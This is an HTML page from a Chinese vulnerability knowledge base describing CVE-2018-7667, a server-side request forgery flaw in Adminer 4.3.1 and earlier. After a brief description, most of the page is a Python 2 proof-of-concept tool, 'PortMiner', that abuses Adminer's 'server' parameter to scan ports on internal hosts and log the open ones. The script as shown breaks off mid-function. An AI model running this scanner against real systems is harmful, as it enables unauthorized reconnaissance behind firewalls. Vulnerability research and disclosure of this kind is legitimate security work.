<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Adminer/%EF%BC%88CVE-2018-7667%EF%BC%89Adminer%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2018-7667）Adminer 服务器端请求伪造漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2018-7667\uff09Adminer \u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../CVE-2021-21311/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../CVE-2021-21311/" class="btn btn-xs btn-link">
        Adminer Server-side Request Forgery on Error Page of Elasticsearch and ClickHouse (CVE-2021-21311)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Adminers%201.1.3%20%EF%BC%88SQLite%203%20%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%89/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Adminers%201.1.3%20%EF%BC%88SQLite%203%20%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%89/" class="btn btn-xs btn-link">
        Adminers 1.1.3 （SQLite 3 写入一句话木马）
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2018-7667adminer">（CVE-2018-7667）Adminer 服务器端请求伪造漏洞<a class="headerlink" href="#cve-2018-7667adminer" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Adminer
4.3.1及之前版本存在服务器端请求伪造漏洞。攻击者可借助'server'参数利用该漏洞绕过防火墙，确定内部主机，扫描其他服务器的端口。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Adminer\&lt;=4.3.1</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span><span class="o">,</span><span class="nn">re</span><span class="o">,</span><span class="nn">ssl</span><span class="o">,</span><span class="nn">warnings</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">time</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">platform</span><span class="w"> </span><span class="kn">import</span> <span class="n">system</span> <span class="k">as</span> <span class="n">system_name</span> 
<span class="kn">from</span><span class="w"> </span><span class="nn">os</span><span class="w"> </span><span class="kn">import</span> <span class="n">system</span> <span class="k">as</span> <span class="n">system_call</span>

<span class="c1">#Adminer Server Side Request Forgery</span>
<span class="c1">#PortMiner Scanner Tool</span>
<span class="c1">#by John Page (hyp3rlinx)</span>
<span class="c1">#ISR: ApparitionSec</span>
<span class="c1">#hyp3rlinx.altervista.org </span>
<span class="c1">#=========================</span>
<span class="c1">#D1rty0Tis says hi.</span>

<span class="c1">#timeout</span>
<span class="n">MAX_TIME</span><span class="o">=</span><span class="mi">32</span>
<span class="c1">#ports to log</span>
<span class="n">port_lst</span><span class="o">=</span><span class="p">[]</span>  
<span class="c1">#Web server response often times out but usually means ports open.</span>
<span class="n">false_pos_ports</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;80&#39;</span><span class="p">,</span><span class="s1">&#39;443&#39;</span><span class="p">]</span>

<span class="n">BANNER</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;</span>
<span class="s1">           ____            _   __  __ _                  </span>
<span class="s1">          |  _  \         | | |  \/  (_)                 </span>
<span class="s1">          | |__) |__  _ __| |_| \  / |_ _ __   ___ _ __  </span>
<span class="s1">          |  ___/ _ \| &#39;__| __| |\/| | | &#39;_ \ / _ \ &#39;__| </span>
<span class="s1">          | |  | (_) | |  | |_| |  | | | | | |  __/ |    </span>
<span class="s1">          |_|   \___/|_|   \__|_|  |_|_|_| |_|\___|_|                                                                                                             </span>
<span class="s1">       &#39;&#39;&#39;</span>


<span class="k">def</span><span class="w"> </span><span class="nf">info</span><span class="p">():</span>
    <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">PortMiner depends on Error messages to determine open/closed ports.&quot;</span>
    <span class="nb">print</span> <span class="s2">&quot;Read operations reported &#39;timed out&#39; may be open/filtered.</span><span class="se">\n</span><span class="s2">&quot;</span>


<span class="k">def</span><span class="w"> </span><span class="nf">greet</span><span class="p">():</span>
    <span class="nb">print</span> <span class="s1">&#39;Adminer Unauthenticated SSRF Port Scanner Tool&#39;</span>
    <span class="nb">print</span> <span class="s1">&#39;Targets Adminer used for MySQL administration</span><span class="se">\n</span><span class="s1">&#39;</span>
    <span class="nb">print</span> <span class="s1">&#39;by hyp3rlinx - apparition security&#39;</span>
    <span class="nb">print</span> <span class="s1">&#39;-----------------------------------------------------</span><span class="se">\n</span><span class="s1">&#39;</span>
    <span class="nb">print</span> <span class="s1">&#39;Scan small ranges or single ports or expect to wait.</span><span class="se">\n</span><span class="s1">&#39;</span>
    <span class="nb">print</span> <span class="s1">&#39;Do not scan networks without authorized permission.&#39;</span>
    <span class="nb">print</span> <span class="s1">&#39;Author not responsible for abuse/misuse.</span><span class="se">\n</span><span class="s1">&#39;</span>


<span class="k">def</span><span class="w"> </span><span class="nf">chk_ports</span><span class="p">(</span><span class="n">p</span><span class="p">):</span> 
    <span class="n">p</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">,</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
    <span class="n">port_arg</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">port_arg</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">port_arg</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;</span> <span class="nb">int</span><span class="p">(</span><span class="n">port_arg</span><span class="p">[</span><span class="mi">0</span><span class="p">]):</span>
                <span class="nb">print</span> <span class="s1">&#39;Port range not valid.&#39;</span>
                <span class="n">raw_input</span><span class="p">()</span>
                <span class="k">return</span>
            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">port_arg</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">&gt;</span><span class="mi">65535</span><span class="p">:</span>
                <span class="nb">print</span> <span class="s1">&#39;Exceeded max Port range 65535.&#39;</span>
                <span class="n">raw_input</span><span class="p">()</span>
                <span class="k">return</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
        <span class="k">return</span> <span class="kc">None</span>
    <span class="k">return</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">port_arg</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span><span class="nb">int</span><span class="p">(</span><span class="n">port_arg</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>



<span class="k">def</span><span class="w"> </span><span class="nf">log</span><span class="p">(</span><span class="n">IP</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">file</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;PortMiner.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
        <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">IP</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">port_lst</span><span class="p">:</span>
            <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
        <span class="n">file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
    <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">See PortMiner.txt&quot;</span>


<span class="k">def</span><span class="w"> </span><span class="nf">use_ssl</span><span class="p">(</span><span class="n">ADMINER</span><span class="p">,</span><span class="n">ADMINER_PORT</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ADMINER</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">ADMINER_PORT</span><span class="p">)))</span>
        <span class="n">s</span><span class="o">=</span><span class="n">ssl</span><span class="o">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">keyfile</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">certfile</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">server_side</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">cert_reqs</span><span class="o">=</span><span class="n">ssl</span><span class="o">.</span><span class="n">CERT_NONE</span><span class="p">,</span> <span class="n">ssl_version</span><span class="o">=</span><span class="n">ssl</span><span class="o">.</span><span class="n">PROTOCOL_SSLv23</span><span class="p">)</span>
        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span> <span class="s2">&quot;&quot;</span>
        <span class="k">return</span> <span class="kc">False</span>
    <span class="k">return</span> <span class="kc">True</span>


<span class="k">def</span><span class="w"> </span><span class="nf">version</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">uri</span><span class="p">,</span><span class="n">use_ssl</span><span class="p">):</span>
    <span class="n">res</span><span class="o">=</span><span class="s2">&quot;&quot;</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
        <span class="k">if</span> <span class="n">use_ssl</span><span class="p">:</span>
            <span class="n">s</span><span class="o">=</span><span class="n">ssl</span><span class="o">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">keyfile</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">certfile</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">server_side</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">cert_reqs</span><span class="o">=</span><span class="n">ssl</span><span class="o">.</span><span class="n">CERT_NONE</span><span class="p">,</span> <span class="n">ssl_version</span><span class="o">=</span><span class="n">ssl</span><span class="o">.</span><span class="n">PROTOCOL_SSLv23</span><span class="p">)</span> 
        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;GET &#39;</span><span class="o">+</span><span class="s1">&#39;/&#39;</span><span class="o">+</span><span class="n">uri</span><span class="o">+</span><span class="s1">&#39;/?server=&#39;</span><span class="o">+</span><span class="s1">&#39;:&#39;</span><span class="o">+</span><span class="s1">&#39;&amp;username=</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span> <span class="s1">&#39;Host up but cant connect.&#39;</span> <span class="c1">#str(e)</span>
        <span class="nb">print</span> <span class="s1">&#39;Re-check Host/Port/URI.&#39;</span>
        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">return</span> <span class="mi">504</span>

    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="n">RES</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">RES</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;Forbidden&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">:</span>
            <span class="nb">print</span> <span class="s1">&#39;Forbidden 403&#39;</span>
            <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="k">return</span> <span class="kc">None</span>
        <span class="k">if</span> <span class="n">RES</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;401 Authorization Required&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">:</span>
            <span class="nb">print</span> <span class="s1">&#39;401 Authorization Required&#39;</span>
            <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="k">return</span> <span class="kc">None</span>
        <span class="n">ver</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;span&gt;(.*)&lt;/span&gt;&#39;</span><span class="p">,</span><span class="n">RES</span><span class="p">,</span><span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="o">|</span><span class="n">re</span><span class="o">.</span><span class="n">MULTILINE</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">RES</span><span class="p">:</span>
            <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="k">return</span> <span class="kc">None</span>
        <span class="k">if</span> <span class="n">ver</span><span class="p">:</span>
            <span class="nb">print</span> <span class="s1">&#39;Your Adminer &#39;</span><span class="o">+</span> <span class="n">ver</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; works for us now.&#39;</span>
            <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="k">return</span> <span class="n">ver</span>

    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="kc">None</span>



<span class="k">def</span><span class="w"> </span><span class="nf">scan</span><span class="p">(</span><span class="n">ADMINER</span><span class="p">,</span><span class="n">ADMINER_PORT</span><span class="p">,</span><span class="n">ADMINER_URI</span><span class="p">,</span><span class="n">TARGET</span><span class="p">,</span><span class="n">PORTS_TO_SCAN</span><span class="p">,</span><span class="n">PRINT_CLOSED</span><span class="p">,</span><span class="n">USE_SSL</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">MAX_TIME</span><span class="p">,</span><span class="n">port_range</span>
    <span class="n">RES</span><span class="o">=</span><span class="s1">&#39;&#39;</span>

    <span class="nb">print</span> <span class="s1">&#39;scanning ports: </span><span class="si">%s</span><span class="s1"> &#39;</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">port_range</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">+</span><span class="s1">&#39;to &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">port_range</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span><span class="o">+</span><span class="s1">&#39; ...&#39;</span>

    <span class="k">for</span> <span class="n">aPort</span> <span class="ow">in</span> <span class="n">port_range</span><span class="p">:</span> 
         <span class="n">aPort</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">aPort</span><span class="p">)</span>

         <span class="k">try</span><span class="p">:</span>
             <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
             <span class="n">s</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="n">MAX_TIME</span><span class="p">)</span>
             <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ADMINER</span><span class="p">,</span><span class="n">ADMINER_PORT</span><span class="p">))</span>

             <span class="k">if</span> <span class="n">USE_SSL</span><span class="p">:</span>
                <span class="n">s</span><span class="o">=</span><span class="n">ssl</span><span class="o">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">keyfile</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">certfile</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">server_side</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">cert_reqs</span><span class="o">=</span><span class="n">ssl</span><span class="o">.</span><span class="n">CERT_NONE</span><span class="p">,</span> <span class="n">ssl_version</span><span class="o">=</span><span class="n">ssl</span><span class="o">.</span><span class="n">PROTOCOL_SSLv23</span><span class="p">)</span>

             <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;GET /&#39;</span><span class="o">+</span><span class="n">ADMINER_URI</span><span class="o">+</span><span class="s1">&#39;/?server=&#39;</span><span class="o">+</span><span class="n">TARGET</span><span class="o">+</span><span class="s1">&#39;:&#39;</span><span class="o">+</span><span class="n">aPort</span><span class="o">+</span><span class="s1">&#39;&amp;username= HTTP/1.1</span><span class="se">\r\n</span><span class="s1">Host: &#39;</span><span class="o">+</span><span class="n">TARGET</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span><span class="p">)</span>

         <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
              <span class="nb">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
              <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
              <span class="k">return</span>

         <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
              <span class="k">try</span><span class="p">:</span>
                 <span class="n">RES</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
                 <span class="c1">###print RES</span>
                 <span class="c1">###Should see HTTP/1.1 403 not 200</span>
                 <span class="k">if</span> <span class="n">RES</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;HTTP/1.1 200 OK&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">:</span>
                     <span class="nb">print</span> <span class="s1">&#39;port &#39;</span><span class="o">+</span><span class="n">aPort</span> <span class="o">+</span>  <span class="s1">&#39; open&#39;</span>
                     <span class="n">port_lst</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">aPort</span><span class="o">+</span><span class="s1">&#39; open&#39;</span><span class="p">)</span>
                     <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                     <span class="k">break</span>

                 <span class="k">if</span> <span class="n">RES</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;400 Bad Request&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">:</span>
                     <span class="nb">print</span> <span class="s1">&#39;400 Bad Request, check params&#39;</span>
                     <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                     <span class="k">break</span>
                     <span class="n">raw_input</span><span class="p">()</span>

                 <span class="n">lst</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;([^\n&lt;div&gt;].*connect to MySQL server on.*[^&lt;/div&gt;\n])|(Lost connection to MySQL server at.*)|(MySQL server has gone away.*)&quot;</span><span class="o">+</span>
                             <span class="s2">&quot;|(No connection could be made because the target machine actively refused it.*)|(A connection attempt failed.*)|(HTTP/1.1 200 OK.*)&quot;</span><span class="p">,</span> <span class="n">RES</span><span class="p">)</span>

                 <span class="k">if</span> <span class="n">lst</span><span class="p">:</span>
                      <span class="n">status</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">lst</span><span class="p">)</span>
                      <span class="k">if</span> <span class="n">status</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;connect to MySQL&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">:</span>
                          <span class="k">if</span> <span class="n">PRINT_CLOSED</span><span class="p">:</span>
                              <span class="nb">print</span> <span class="s1">&#39;port &#39;</span><span class="o">+</span> <span class="n">aPort</span> <span class="o">+</span>  <span class="s1">&#39; closed&#39;</span>
                          <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                          <span class="k">break</span>
                      <span class="k">elif</span> <span class="n">status</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;machine actively refused it.&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">:</span>
                          <span class="k">if</span> <span class="n">PRINT_CLOSED</span><span class="p">:</span>
                              <span class="nb">print</span> <span class="s1">&#39;port &#39;</span><span class="o">+</span> <span class="n">aPort</span> <span class="o">+</span>  <span class="s1">&#39; closed&#39;</span>
                          <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                          <span class="k">break</span>
                      <span class="k">elif</span> <span class="n">status</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;A connection attempt failed&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">:</span>
                          <span class="k">if</span> <span class="n">PRINT_CLOSED</span><span class="p">:</span>
                               <span class="nb">print</span> <span class="s1">&#39;port &#39;</span><span class="o">+</span> <span class="n">aPort</span> <span class="o">+</span>  <span class="s1">&#39; closed&#39;</span>
                          <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                          <span class="k">break</span>
                      <span class="k">elif</span> <span class="n">status</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;reading initial communication packet&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">:</span>
                          <span class="nb">print</span> <span class="s1">&#39;port &#39;</span><span class="o">+</span><span class="n">aPort</span> <span class="o">+</span>  <span class="s1">&#39; open&#39;</span>
                          <span class="n">port_lst</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">aPort</span><span class="o">+</span><span class="s1">&#39; open&#39;</span><span class="p">)</span>
                          <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                          <span class="k">break</span>
                      <span class="k">elif</span> <span class="n">status</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;MySQL server has gone away&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">:</span>
                          <span class="nb">print</span> <span class="s1">&#39;port &#39;</span><span class="o">+</span><span class="n">aPort</span> <span class="o">+</span>  <span class="s1">&#39; open&#39;</span>
                          <span class="n">port_lst</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">aPort</span><span class="o">+</span><span class="s1">&#39; open&#39;</span><span class="p">)</span>
                          <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                          <span class="k">break</span>
                      <span class="k">elif</span> <span class="n">status</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;Bad file descriptor&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">:</span>
                          <span class="nb">print</span> <span class="s1">&#39;port &#39;</span><span class="o">+</span><span class="n">aPort</span> <span class="o">+</span>  <span class="s1">&#39; open&#39;</span>
                          <span class="n">port_lst</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">aPort</span><span class="o">+</span><span class="s1">&#39; open&#39;</span><span class="p">)</span>
                          <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                          <span class="k">break</span>
                      <span class="k">elif</span> <span class="n">status</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;Got packets out of order&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">:</span>
                          <span class="nb">print</span> <span class="s1">&#39;port &#39;</span><span class="o">+</span><span class="n">aPort</span> <span class="o">+</span>  <span class="s1">&#39; open&#39;</span>
                          <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                          <span class="k">break</span>

              <span class="k">except</span> <span class="ne">Exception</span>  <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                  <span class="n">msg</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
                  <span class="c1">###print msg</span>
                  <span class="k">if</span> <span class="n">msg</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;timed out&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span> <span class="ow">and</span> <span class="n">aPort</span> <span class="ow">in</span> <span class="n">false_pos_ports</span><span class="p">:</span>
                      <span class="nb">print</span> <span class="s1">&#39;port &#39;</span><span class="o">+</span><span class="n">aPort</span> <span class="o">+</span>  <span class="s1">&#39; open&#39;</span>
                      <span class="n">port_lst</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">aPort</span><span class="o">+</span><span class="s1">&#39; open&#39;</span><span class="p">)</span>
                      <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                      <span class="k">break</span>
                  <span class="k">elif</span> <span class="n">msg</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;timed out&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">:</span> 
                      <span class="nb">print</span> <span class="s1">&#39;port &#39;</span><span class="o">+</span><span class="n">aPort</span> <span class="o">+</span> <span class="s1">&#39; timed out&#39;</span>
                      <span class="n">port_lst</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">aPort</span><span class="o">+</span><span class="s1">&#39; read operation timed out&#39;</span><span class="p">)</span>
                      <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                      <span class="k">break</span>
                  <span class="k">else</span><span class="p">:</span>
                      <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                      <span class="k">break</span>

    <span class="k">if</span> <span class="n">port_lst</span><span class="p">:</span>
        <span class="n">log</span><span class="p">(</span><span class="n">TARGET</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
